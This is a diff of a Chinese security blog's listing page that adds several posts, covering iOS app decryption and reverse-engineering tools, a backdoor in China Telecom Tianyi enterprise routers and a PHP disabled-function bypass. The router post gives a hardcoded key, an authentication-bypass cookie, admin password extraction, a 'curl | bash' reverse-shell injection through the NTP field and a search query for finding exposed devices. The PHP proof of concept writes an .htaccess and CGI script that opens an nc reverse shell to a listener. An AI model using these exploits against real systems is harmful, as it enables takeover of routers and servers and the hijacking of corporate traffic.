-<h4 id="From"><a href="#From" class="headerlink" title="From"></a>From</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://certbot.eff.org/</span><br><span class="line">https://www.digitalocean.com/community/tutorials/how-to-set-up-apache-virtual-hosts-on-ubuntu-14-04-lts</span><br></pre></td></tr></table></figure>
+<p>去掉arm64</p>
+<blockquote>
+<p>把/var/mobile/Applications/<uuid>/TargetApp.app/XXXTargetApp 复制到mac上</uuid></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; lipo xxx -remove arm64 -output xxx.remove</span><br></pre></td></tr></table></figure>
+<p>砸壳<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; cp dumpdecrypted.dylib /var/mobile/Applications/&lt;UUID&gt;/TargetApp.app/Document</span><br><span class="line"></span><br><span class="line">&gt; cd /var/mobile/Applications/&lt;UUID&gt;/Document</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>输入命令行，回车砸壳完毕</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DYLD_INSERT_LIBRARIES=dumpdecrypted.dylib /var/mobile/Applications/XXXXXX/TargetApp.app/XXXTargetApp</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>显示</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[+] detected 32bit ARM binary in memory.</span><br><span class="line">[+] offset to cryptid found: @0x81a78(from 0x81000) = a78</span><br><span class="line">[+] Found encrypted data at address 00004000 of length 6569984 bytes - type 1.</span><br><span class="line">[+] Opening /private/var/mobile/Containers/Bundle/Application/03B61840-2349-4559-B28E-0E2C6541F879/TargetApp.app/TargetApp for reading.</span><br><span class="line">[+] Reading header</span><br><span class="line">[+] Detecting header type[+] Executable is a plain MACH-O image</span><br><span class="line">[+] Opening TargetApp.decrypted for writing.</span><br><span class="line">[+] Copying the not encrypted start of the file</span><br><span class="line">[+] Dumping the decrypted data into the file</span><br><span class="line">[+] Copying the not encrypted remainder of the file</span><br><span class="line">[+] Setting the LC_ENCRYPTION_INFO-&gt;cryptid to 0 at offset a78</span><br><span class="line">[+] Closing original file[+] Closing dump file</span><br></pre></td></tr></table></figure>
+<h3 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a><a href="https://portswigger.net" target="_blank" rel="external">BurpSuite</a></h3><h3 id="Introspy-Analyzer"><a href="#Introspy-Analyzer" class="headerlink" title="Introspy-Analyzer"></a><a href="https://github.com/iSECPartners/Introspy-Analyzer" target="_blank" rel="external">Introspy-Analyzer</a></h3><p>Introspy-IOS have a error from github <a href="https://isecpartners.github.io/Introspy-iOS/" target="_blank" rel="external">download</a> install have a error，example：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">iPhone:~ root# dpkg -i com.isecpartners.introspy-v0.4-iOS_7.deb</span><br><span class="line">(Reading database ... 1695 files and directories currently installed.)</span><br><span class="line">Preparing to replace com.isecpartners.introspy 0.4.0-31 (using com.isecpartners.introspy-v0.4-iOS_7.deb) ...</span><br><span class="line">Unpacking replacement com.isecpartners.introspy ...</span><br><span class="line">dpkg: dependency problems prevent configuration of com.isecpartners.introspy:</span><br><span class="line"> com.isecpartners.introspy depends on preferenceloader; however:</span><br><span class="line">  Package preferenceloader is not installed.</span><br><span class="line"> com.isecpartners.introspy depends on applist; however:</span><br><span class="line">  Package applist is not installed.</span><br><span class="line">dpkg: error processing com.isecpartners.introspy (--install):</span><br><span class="line"> dependency problems - leaving unconfigured</span><br><span class="line">Errors were encountered while processing:</span><br><span class="line"> com.isecpartners.introspy</span><br></pre></td></tr></table></figure></p>
+<p>fix the bug<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cydia search preferenceloader reinstall</span><br></pre></td></tr></table></figure></p>
+<p>Install introspy-analyzer<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; pip install git+https://github.com/iSECPartners/Introspy-Analyzer.git</span><br><span class="line">&gt; python -m introspy -p ios -o output -f 192.168.1.12</span><br><span class="line">&gt; python -m introspy -p ios -l introspy.db</span><br><span class="line">&gt; python -m introspy -p ios -i urls introspy.db</span><br></pre></td></tr></table></figure></p>
+<h3 id="ios-ssl-kill-switch"><a href="#ios-ssl-kill-switch" class="headerlink" title="ios-ssl-kill-switch"></a><a href="https://github.com/iSECPartners/ios-ssl-kill-switch" target="_blank" rel="external">ios-ssl-kill-switch</a></h3><h3 id="iFunbox"><a href="#iFunbox" class="headerlink" title="iFunbox"></a><a href="http://www.i-funbox.com/" target="_blank" rel="external">iFunbox</a></h3><h3 id="reveal"><a href="#reveal" class="headerlink" title="reveal"></a><a href="https://revealapp.com/" target="_blank" rel="external">reveal</a></h3><h3 id="Clutch"><a href="#Clutch" class="headerlink" title="Clutch"></a><a href="https://github.com/KJCracks/Clutch/releases" target="_blank" rel="external">Clutch</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">iPhone:~ root# chmod +x Clutch</span><br><span class="line">iPhone:~ root# mv /var/root/Clutch /usr/bin/</span><br><span class="line">iPhone:~ root# Clutch</span><br><span class="line"></span><br><span class="line">Usage: Clutch [OPTIONS]</span><br><span class="line">-b --binary-dump &lt;value&gt; Only dump binary files from specified bundleID</span><br><span class="line">-d --dump &lt;value&gt;        Dump specified bundleID into .ipa file</span><br><span class="line">-i --print-installed     Print installed applications</span><br><span class="line">   --clean               Clean /var/tmp/clutch directory</span><br><span class="line">   --version             Display version and exit</span><br><span class="line">-? --help                Display this help and exit</span><br><span class="line">-n --no-color            Print with colors disabled</span><br></pre></td></tr></table></figure>
+<h3 id="iRET-ios6-x-or-ios7-x"><a href="#iRET-ios6-x-or-ios7-x" class="headerlink" title="iRET(ios6.x or ios7.x)"></a>iRET(ios6.x or ios7.x)</h3><h4 id="iRET"><a href="#iRET" class="headerlink" title="iRET"></a><a href="https://github.com/S3Jensen/iRET" target="_blank" rel="external">iRET</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; dpkg -i iRET.deb</span><br></pre></td></tr></table></figure>
+<p>browser open website http://<ip>:5555</ip></p>
+<p>####perl<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; wget http://coredev.nl/cydia/coredev.pub</span><br><span class="line">&gt; apt-key add coredev.pub</span><br><span class="line">&gt; echo &apos;deb http://coredev.nl/cydia iphone main&apos; &gt; /etc/apt/sources.list.d/coredev.nl.list</span><br><span class="line">&gt; apt-get update</span><br><span class="line">&gt; apt-get install perl</span><br></pre></td></tr></table></figure></p>
+<h4 id="dumpdecrypted-1"><a href="#dumpdecrypted-1" class="headerlink" title="dumpdecrypted"></a>dumpdecrypted</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; git clone https://github.com/stefanesser/dumpdecrypted</span><br><span class="line">&gt; cd dumpdecrypted &amp;&amp; make</span><br><span class="line">&gt; scp dumpdecrypted.dylib root@&lt;ip&gt;:/Applications/iRE.app</span><br></pre></td></tr></table></figure>
+<p>添加源</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://coredev.nl/cydia/</span><br><span class="line">http://nix.howett.net/theos/</span><br></pre></td></tr></table></figure>
+<h4 id="theos"><a href="#theos" class="headerlink" title="theos"></a>theos</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IOS8.1 SDK 链接: http://pan.baidu.com/s/1kUOKYUz3 密码: cmcr</span><br></pre></td></tr></table></figure>
+<h3 id="idb"><a href="#idb" class="headerlink" title="idb"></a><a href="https://github.com/dmayer/idb" target="_blank" rel="external">idb</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; brew install qt cmake usbmuxd libimobiledevice</span><br></pre></td></tr></table></figure>
+<h3 id="fix-Cydia-install-lsof"><a href="#fix-Cydia-install-lsof" class="headerlink" title="fix Cydia install lsof"></a>fix Cydia install lsof</h3><blockquote>
+<p>download <a href="https://github.com/sunkehappy/iOS-reverse-engineering-tools-backup/blob/master/lsof-arm7-iOS4.2" target="_blank" rel="external">lsof-arm7-iOS4.2</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iPhone5S:~ root# mv /usr/bin/lsof /usr/bin/lsof-backup</span><br><span class="line">iPhone5S:~ root# wget https://github.com/sunkehappy/iOS-reverse-engineering-tools-backup/blob/master/lsof-arm7-iOS4.2?raw=true -O /usr/bin/lsof</span><br><span class="line">iPhone5S:~ root# chmod +x /usr/bin/lsof</span><br></pre></td></tr></table></figure>
           
         
       
@@ -1660,7 +1579,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/06/01/Cloudflare-Email-Protection-Decoder/">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/07/04/China-Telecom-Tianyi-Route-Backdoor/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="xl7dev">
@@ -1685,8 +1604,8 @@
             
               
                 
-                <a class="post-title-link" href="/2016/06/01/Cloudflare-Email-Protection-Decoder/" itemprop="url">
-                  Cloudflare Email Protection Decoder
+                <a class="post-title-link" href="/2016/07/04/China-Telecom-Tianyi-Route-Backdoor/" itemprop="url">
+                  China Telecom Tianyi Route Backdoor
                 </a>
               
             
@@ -1700,8 +1619,8 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-01T16:06:05+08:00">
-                2016-06-01
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-07-04T23:37:24+08:00">
+                2016-07-04
               </time>
             
 
@@ -1737,14 +1656,138 @@
 
       
         
-          <h3 id="Encode-Code"><a href="#Encode-Code" class="headerlink" title="Encode Code"></a>Encode Code</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=&quot;__cf_email__&quot; href=&quot;http://cloudflare.com/email-protection.html&quot; class=&quot;f091809582839f9eb080999e97848582849c95de939f9d&quot;&gt;[email protected]&lt;/a&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">/* &lt;!--[CDATA[ */</span><br><span class="line">(function() &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        var s, a, i, j, r, c, l = document.getElementById(&quot;__cf_email__&quot;);</span><br><span class="line">        a = l.className;</span><br><span class="line">        if (a) &#123;</span><br><span class="line">            s = &apos;&apos;;</span><br><span class="line">            r = parseInt(a.substr(0, 2), 16);</span><br><span class="line">            for (j = 2; a.length - j; j += 2) &#123;</span><br><span class="line">                c = parseInt(a.substr(j, 2), 16) ^ r;</span><br><span class="line">                s += String.fromCharCode(c);</span><br><span class="line">            &#125;</span><br><span class="line">            s = document.createTextNode(s);</span><br><span class="line">            l.parentNode.replaceChild(s, l);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch(e) &#123;&#125;</span><br><span class="line">&#125;)();</span><br><span class="line">/* ]]--&gt; */</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/06/01/Cloudflare-Email-Protection-Decoder/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+          
+            <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>电信天意宽带政企平台是电信给政府和企业做的一款设备（外包给中兴做的），其包括VPN、用户上网行为管理等功能。覆盖全上海乃至南方数个城市数万企业与政府网关设备，通过这个后门可直接获取路由器超级管理员账号密码，并取得路由器系统root权限，进而劫持企业内部流量。</p>
+<h3 id="访问地址"><a href="#访问地址" class="headerlink" title="访问地址"></a>访问地址</h3><blockquote>
+<p>后台地址图标为天翼宽带，地址如下：</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:port/set/index.html</span><br></pre></td></tr></table></figure>
+<h3 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">key:</span><br><span class="line">    123456789abcdef03456789abcdef01256789abcdef01234789abcdef0123456</span><br><span class="line">Data:</span><br><span class="line">    820ff917fff0407f6dc8d69e09c78723</span><br></pre></td></tr></table></figure>
+<p><a href="http://extranet.cryptomathic.com/aescalc/index" target="_blank" rel="external">解密地址</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Output:</span><br><span class="line">    636F6E66696700000000000000000000</span><br><span class="line">hex decode:</span><br><span class="line">    config      //password</span><br></pre></td></tr></table></figure></p>
+<h3 id="添加Cookie字段值"><a href="#添加Cookie字段值" class="headerlink" title="添加Cookie字段值"></a>添加Cookie字段值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bizstore_note=zte</span><br></pre></td></tr></table></figure>
+<h3 id="获取超级管理员密码"><a href="#获取超级管理员密码" class="headerlink" title="获取超级管理员密码"></a>获取超级管理员密码</h3><p>编辑telecomadmin用户右击审查元素查看密码值</p>
+<h3 id="命令执行反弹shell"><a href="#命令执行反弹shell" class="headerlink" title="命令执行反弹shell"></a>命令执行反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">系统管理 &gt;&gt; 时间管理 &gt;&gt; NTP服务器1: `curl http://**.**.**.**/shell.sh | bash`</span><br></pre></td></tr></table></figure>
+<h3 id="Google-search"><a href="#Google-search" class="headerlink" title="Google search"></a>Google search</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intitle:管理平台登陆</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/07/03/Bypass-PHP-system-functions-disabled-via-mod-cgi/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/07/03/Bypass-PHP-system-functions-disabled-via-mod-cgi/" itemprop="url">
+                  Bypass PHP system functions disabled via mod_cgi
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-07-03T23:31:39+08:00">
+                2016-07-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="至少需要满足以下几点"><a href="#至少需要满足以下几点" class="headerlink" title="至少需要满足以下几点"></a>至少需要满足以下几点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. apache环境</span><br><span class="line">2. mod_cgi已启用</span><br><span class="line">3. htaccess的文件必须被允许</span><br><span class="line">4. 你必须能够写入文件</span><br></pre></td></tr></table></figure>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd = &quot;nc -c &apos;/bin/bash&apos; 172.16.15.1 4444&quot;; //command to be executed</span><br><span class="line">$shellfile = &quot;#!/bin/bash\n&quot;; //using a shellscript</span><br><span class="line">$shellfile .= &quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;; //header is needed, otherwise a 500 error is thrown when there is output</span><br><span class="line">$shellfile .= &quot;$cmd&quot;; //executing $cmd</span><br><span class="line">function checkEnabled($text,$condition,$yes,$no) //this surely can be shorter</span><br><span class="line">&#123;</span><br><span class="line">	echo &quot;$text: &quot; . ($condition ? $yes : $no) . &quot;&lt;br&gt;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($_GET[&apos;checked&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">	@file_put_contents(&apos;.htaccess&apos;, &quot;\nSetEnv HTACCESS on&quot;, FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed</span><br><span class="line">	header(&apos;Location: &apos; . $_SERVER[&apos;PHP_SELF&apos;] . &apos;?checked=true&apos;); //execute the script again to see if the htaccess test worked</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	$modcgi = in_array(&apos;mod_cgi&apos;, apache_get_modules()); // mod_cgi enabled?</span><br><span class="line">	$writable = is_writable(&apos;.&apos;); //current dir writable?</span><br><span class="line">	$htaccess = !empty($_SERVER[&apos;HTACCESS&apos;]); //htaccess enabled?</span><br><span class="line">		checkEnabled(&quot;Mod-Cgi enabled&quot;,$modcgi,&quot;Yes&quot;,&quot;No&quot;);</span><br><span class="line">		checkEnabled(&quot;Is writable&quot;,$writable,&quot;Yes&quot;,&quot;No&quot;);</span><br><span class="line">		checkEnabled(&quot;htaccess working&quot;,$htaccess,&quot;Yes&quot;,&quot;No&quot;);</span><br><span class="line">	if(!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess))</span><br><span class="line">	&#123;</span><br><span class="line">		echo &quot;Error. All of the above must be true for the script to work!&quot;; //abort if not</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		checkEnabled(&quot;Backing up .htaccess&quot;,copy(&quot;.htaccess&quot;,&quot;.htaccess.bak&quot;),&quot;Suceeded! Saved in .htaccess.bak&quot;,&quot;Failed!&quot;); //make a backup, cause you never know.</span><br><span class="line">		checkEnabled(&quot;Write .htaccess file&quot;,file_put_contents(&apos;.htaccess&apos;,&quot;Options +ExecCGI\nAddHandler cgi-script .dizzle&quot;),&quot;Succeeded!&quot;,&quot;Failed!&quot;); //.dizzle is a nice extension</span><br><span class="line">		checkEnabled(&quot;Write shell file&quot;,file_put_contents(&apos;shell.dizzle&apos;,$shellfile),&quot;Succeeded!&quot;,&quot;Failed!&quot;); //write the file</span><br><span class="line">		checkEnabled(&quot;Chmod 777&quot;,chmod(&quot;shell.dizzle&quot;,0777),&quot;Succeeded!&quot;,&quot;Failed!&quot;); //rwx</span><br><span class="line">		echo &quot;Executing the script now. Check your listener &lt;img src = &apos;shell.dizzle&apos; style = &apos;display:none;&apos;&gt;&quot;; //call the script</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="From"><a href="#From" class="headerlink" title="From"></a>From</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.asdizzle.com/index.php/2016/05/02/getting-shell-access-with-php-system-functions-disabled/</span><br></pre></td></tr></table></figure>
+          
         
       
     </div>
@@ -1776,7 +1819,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1817,7 +1860,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">73</span>
+              <span class="site-state-item-count">83</span>
               <span class="site-state-item-name">posts</span>
             </a>
           </div>
@@ -1827,7 +1870,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">58</span>
+                <span class="site-state-item-count">64</span>
                 <span class="site-state-item-name">tags</span>
               </a>
             </div>
